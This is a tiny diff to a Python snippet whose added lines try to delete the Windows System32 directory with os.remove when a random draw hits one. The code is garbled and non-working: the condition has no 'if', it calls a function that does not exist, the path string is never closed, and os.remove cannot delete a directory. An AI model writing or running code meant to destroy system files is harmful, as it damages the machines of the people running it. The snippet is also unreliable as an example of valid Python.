@@ -1,4 +1,4 @@
 import os
 import random
-randomnum(0, 10) ==1:
-    os.remove.system:32
+randomnum(0, 10) == 1:
+    os.remove("C:\Windows\System32)
